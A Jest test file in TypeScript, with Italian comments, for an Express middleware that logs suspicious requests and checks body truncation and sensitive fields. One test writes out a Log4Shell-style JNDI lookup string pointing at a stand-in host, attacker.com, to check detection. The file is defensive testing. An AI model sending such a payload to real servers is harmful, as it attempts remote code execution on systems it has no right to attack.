import 'reflect-metadata';
import { ThreatLogger } from '../threatLogger';

import mongoose from 'mongoose';

// Mocks
const mockLogger = {
    info: jest.fn(),
    error: jest.fn(),
    warn: jest.fn(),
};

const mockThreatLogService = {
    saveLog: jest.fn().mockResolvedValue({}),
};

const mockPatternAnalysisService = {
    applyAnalysis: jest.fn().mockResolvedValue({
        fingerprint: 'test-hash',
        analysis: { suspicious: true, score: 50, indicators: ['test'], isBot: false },
        geo: { country: 'IT' }
    }),
};

const mockConfigProvider = {
    mongoUri: 'mongodb://localhost:27017/threatintel',
    isTest: true
};

// Mock solo mongoose.connect per evitare connessioni reali
jest.spyOn(mongoose, 'connect').mockResolvedValue({} as any);

describe('ThreatLogger', () => {
    let threatLogger: ThreatLogger;

    beforeEach(() => {
        jest.clearAllMocks();
        threatLogger = new ThreatLogger(
            mockLogger as any,
            mockConfigProvider as any,
            mockThreatLogService as any,
            mockPatternAnalysisService as any
        );
    });

    it('should initialize correctly', () => {
        expect(mockLogger.info).toHaveBeenCalledWith(expect.stringContaining('Inizializzato'));
    });

    describe('middleware', () => {
        let req: any;
        let res: any;
        let next: jest.Mock;

        beforeEach(() => {
            req = {
                path: '/test-path',
                method: 'GET',
                headers: { 'user-agent': 'test-agent' },
                ip: '1.2.3.4',
                get: jest.fn().mockReturnValue('test-value'),
                query: {},
                body: {}
            };
            res = {
                statusCode: 200,
                on: jest.fn((event, cb) => {
                    if (event === 'finish') {
                        // Salvo il callback per triggerarlo manualmente nei test
                        res._finishCb = cb;
                    }
                }),
                get: jest.fn().mockReturnValue(100),
            };
            next = jest.fn();
        });

        it('should skip logging for /api/ routes', async () => {
            req.path = '/api/v1/test';
            const mw = threatLogger.middleware();
            await mw(req, res, next);
            expect(next).toHaveBeenCalled();
            expect(mockPatternAnalysisService.applyAnalysis).not.toHaveBeenCalled();
        });

        it('should skip if disabled', async () => {
            threatLogger.enabled = false;
            const mw = threatLogger.middleware();
            await mw(req, res, next);
            expect(next).toHaveBeenCalled();
            expect(mockPatternAnalysisService.applyAnalysis).not.toHaveBeenCalled();
        });

        it('should log a suspicious request on finish', async () => {
            const mw = threatLogger.middleware();
            await mw(req, res, next);

            expect(next).toHaveBeenCalled();
            expect(mockPatternAnalysisService.applyAnalysis).toHaveBeenCalledWith(req, '1.2.3.4');

            // Simulo la fine della risposta
            if (res._finishCb) await res._finishCb();

            expect(mockThreatLogService.saveLog).toHaveBeenCalledWith(expect.objectContaining({
                request: expect.objectContaining({ ip: '1.2.3.4' }),
                fingerprint: expect.objectContaining({ score: 50 })
            }));
        });

        it('should detect JNDI payload in headers', async () => {
            req.headers['x-forwarded-for'] = '${jndi:ldap://attacker.com/a}';
            const mw = threatLogger.middleware();
            await mw(req, res, next);

            expect(req.jndiPayload).toContain('jndi');
        });
    });

    describe('sanitizeBody', () => {
        it('should truncate large bodies', () => {
            threatLogger.maxBodySize = 0.001; // 1 byte circa per il test
            const largeBody = { data: 'a'.repeat(2000) };
            const result = threatLogger.sanitizeBody(largeBody);
            expect(result.__truncated).toBe(true);
        });

        it('should log sensitive fields presence', () => {
            const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
            const body = { password: '123', other: 'data' };
            threatLogger.sanitizeBody(body);
            expect(consoleSpy).toHaveBeenCalledWith('La richiesta contiene informazioni sensibili');
            consoleSpy.mockRestore();
        });
    });
});
